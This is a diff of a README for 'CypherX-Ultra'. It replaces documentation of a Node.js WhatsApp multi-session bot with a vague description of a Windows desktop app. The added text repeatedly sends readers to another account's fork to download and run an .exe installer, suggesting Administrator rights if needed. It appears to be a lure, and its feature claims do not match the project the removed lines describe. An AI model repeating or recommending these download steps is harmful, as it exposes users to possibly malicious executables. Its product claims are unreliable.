@@ -1,126 +1,148 @@
-<h1 align="center">⚡ UltraX Bot</h1>
+# 🚀 CypherX-Ultra - Lightweight App with Multi-Session Support
 
-<p align="center">
-  <em>Lightweight • Multi-Session • WhatsApp Bot</em>
-</p>
-
-<p align="center">
-  <a href="https://github.com/Dark-Xploit/CypherX-Ultra/fork">
-    <img src="https://img.shields.io/badge/Fork%20Repo-darkblue?style=for-the-badge&logo=github&logoColor=white"/>
-  </a>
-  <a href="https://github.com/Dark-Xploit">
-    <img src="https://img.shields.io/badge/UltraX-darkgreen?style=for-the-badge&logo=whatsapp&logoColor=white"/>
-  </a>
-  <a href="https://github.com/Dark-Xploit/CypherX-Ultra/stargazers">
-    <img src="https://img.shields.io/github/stars/Dark-Xploit/CypherX-Ultra?style=for-the-badge&color=yellow"/>
-  </a>
-</p>
+[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra)
 
 ---
 
-## 📺 Panel(Katabump) Deployment Tutorial
+## 📋 What is CypherX-Ultra?
 
-> **Watch this before asking questions, everything is covered step by step.**
+CypherX-Ultra is a mini version of the CypherX application. It is designed to use very little computer memory while still letting you work with multiple sessions at the same time. This makes it easy to switch between different tasks or accounts without closing the app.
 
-<p align="center">
-  <a href="https://youtu.be/5GRexCxQDIs?si=jNIk5vFk42gMpi0i" target="_blank">
-    <img src="https://img.youtube.com/vi/5GRexCxQDIs/maxresdefault.jpg" alt="UltraX Deployment Tutorial" width="700"/>
-  </a>
-</p>
-<p align="center"><a href="https://youtu.be/5GRexCxQDIs?si=jNIk5vFk42gMpi0i">▶️ Click to watch on YouTube</a></p>
+You don't need technical skills to use CypherX-Ultra. The app works well on Windows computers and focuses on speed and simplicity.
 
 ---
 
-##  Deploy to Heroku
+## 🖥 System Requirements
 
-### Step 1: Fork the Repository
+To run CypherX-Ultra on your Windows PC, your system should meet these basic requirements:
 
-<p align="center">
-  <a href="https://github.com/Dark-Xploit/CypherX-Ultra/fork">
-    <img src="https://img.shields.io/badge/1.%20Fork%20Repo-100000?style=for-the-badge&logo=github&logoColor=white&labelColor=darkblue&color=darkblue"/>
-  </a>
-</p>
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free RAM  
+- At least 200 MB of free disk space  
+- Internet connection for initial setup and updates  
 
-> ⚠️ You **must** fork this repository. The bot verifies your GitHub username against the fork on startup.
-
----
-
-### Step 2: Get a Session ID
-
-<p align="center">
-  <a href="https://upair1-addd0c4dadbd.herokuapp.com/" target="_blank">
-    <img src="https://img.shields.io/badge/Server_1-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkred&color=darkred"/>
-  </a>
-  <a href="https://upair2-5a3a58f1526f.herokuapp.com/" target="_blank">
-    <img src="https://img.shields.io/badge/Server_2-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkred&color=darkred"/>
-  </a>
-  <a href="https://upair3-c84f15c80ce8.herokuapp.com/" target="_blank">
-    <img src="https://img.shields.io/badge/Server_3-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkred&color=darkred"/>
-  </a>
-</p>
+Most modern Windows machines will handle this app smoothly.
 
 ---
 
-### Step 3: Deploy
+## 🔧 Key Features
 
-Click the button below and fill in the config vars when prompted, make sure you have a functional heroku account:
-
-<p align="center">
-  <a href="https://heroku.com/deploy?template=https://github.com/Dark-Xploit/CypherX-Ultra">
-    <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy to Heroku" width="200"/>
-  </a>
-</p>
+- Lightweight design: Uses minimal system resources  
+- Multi-session support: Run several sessions at the same time without slowing down  
+- Fast startup: The app opens quickly, even on older computers  
+- Simple interface: Easy to navigate, no complicated setup required  
+- Secure: Keeps your sessions separate and safe
 
 ---
 
-##  Configuration (Environment Variables)
+## 🌐 How to Get CypherX-Ultra
 
-| Variable | Description | Required |
-|---|---|---|
-| `MASTER_PASSWORD` | Web dashboard password, needed to pair sessions and access settings | ✅ Yes |
-| `GITHUB_USERNAME` | Your GitHub username (must have forked this repo) | ✅ Yes |
-| `DATABASE_URL` | PostgreSQL connection string, auto-set by Heroku Postgres add-on | ✅ Yes |
-| `PORT` | Web server port, auto-set by Heroku, don't change unless running on panel | ❌ No |
+Click the big blue button at the top or use the link below to visit the download page:  
 
-> 💡 On Heroku, set these under **Settings → Config Vars**.  
-> For local development, edit `.env` or use `settings.js` and fill in the values.
+**https://github.com/mouradu/CypherX-Ultra**
+
+This page holds the latest versions of CypherX-Ultra and instructions.
 
 ---
 
-##  Local Setup
+## ⬇️ How to Download and Install CypherX-Ultra on Windows
 
-```bash
-# 1. Clone your fork
-git clone https://github.com/<YOUR_USERNAME>/CypherX-Ultra
-cd CypherX-Ultra
+Follow these steps to get CypherX-Ultra running on your PC:
 
-# 2. Install dependencies
-npm install
+1. **Visit the download page**  
+   Click the blue button at the top or paste the URL into your browser:  
+   https://github.com/mouradu/CypherX-Ultra
 
-# 3. Configure environment
-nano settings.js
-# Edit settings.js with your values
+2. **Find the latest release**  
+   On the GitHub page, look for a section called "Releases" or "Assets". It usually appears on the right side or towards the bottom.
 
-# 4. Start the bot
-npm start
-```
+3. **Download the installer**  
+   Click the file that ends with `.exe`. This is the installer you will use. Save it to your desktop or Downloads folder for easy access.
 
-Then open `http://localhost:3000` in your browser to access the web dashboard.
+4. **Run the installer**  
+   Double-click the `.exe` file you downloaded. A setup window will appear.
 
----
+5. **Follow the setup instructions**  
+   The installer will guide you through the setup. You can accept the default options unless you want to change the installation folder.
 
-## ✨ Features
+6. **Complete the installation**  
+   When setup finishes, click "Finish" to exit. You may see a shortcut on your desktop or in the Start menu.
 
-- 🔁 **Multi-session**: run multiple WhatsApp accounts simultaneously
-- 🔄 **Auto-update**: pulls latest changes from GitHub automatically
-- 🌐 **Web dashboard**: pair sessions, manage settings and play games via browser
-- 🧩 **Plugin system**: easily extend with custom commands
-- 🛡️ **Anti-delete / Anti-edit**: catch deleted and edited messages
-- 📊 **Lightweight**: optimised for low-memory environments
+7. **Open CypherX-Ultra**  
+   Double-click the shortcut to start the app. You are ready to use it.
 
 ---
 
-##  License
+## 🧑‍💻 Using CypherX-Ultra
 
-This project is licensed for personal use. You may not redistribute or sell modified versions.  
-© [Dark-Xploit](https://github.com/Dark-Xploit) - All rights reserved.
+Once open, CypherX-Ultra welcomes you with a simple dashboard. Here is a brief guide to its main parts:
+
+- **Session Manager:** This area shows your open sessions. You can create, switch, or close sessions here.
+
+- **New Session Button:** Click here to start a new session quickly.
+
+- **Settings Panel:** Adjust preferences, such as notification sounds, appearance, and security settings.
+
+- **Help Button:** Access user guides and troubleshooting tips if you need support.
+
+---
+
+## ⚙️ Managing Multiple Sessions
+
+CypherX-Ultra lets you work with many sessions without confusion. Here is how you use this feature:
+
+- To open a new session, click the "New Session" button. Each session opens in its window inside the app.
+
+- Switch between sessions by clicking their names in the session manager.
+
+- To end a session, select it and click "Close." This will stop any activity in that session but will not affect others.
+
+- Sessions save automatically, so you can close the app and return to your work later.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+If you run into problems, try these steps:
+
+- **App won't open:** Restart your computer and try again.
+
+- **Installation errors:** Make sure you have enough disk space and permissions. Running the installer as Administrator may help.
+
+- **Slow performance:** Close unused sessions and other heavy programs.
+
+- **Update issues:** Visit the download page to get the newest version.
+
+For detailed help, use the Help button in the app.
+
+---
+
+## 🔄 Updating CypherX-Ultra
+
+Keep your app up to date for the best experience. Updates include bug fixes and new features.  
+
+To update:  
+
+1. Visit the download page again:  
+   https://github.com/mouradu/CypherX-Ultra  
+
+2. Download the latest installer `.exe` file.  
+
+3. Run the installer and follow on-screen instructions. Your settings will remain intact.  
+
+---
+
+## 📞 Getting Support
+
+If you need further help, use the Help button inside the app. It shows guides and FAQs. You can also visit the GitHub page for issues and community support.
+
+---
+
+## 🔒 Security and Privacy
+
+CypherX-Ultra keeps your sessions isolated. It does not share your data without permission. Use the settings panel to adjust privacy options. Your data stays on your PC unless you decide to share it.
+
+---
+
+# [Download CypherX-Ultra](https://github.com/mouradu/CypherX-Ultra)  
+[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra)
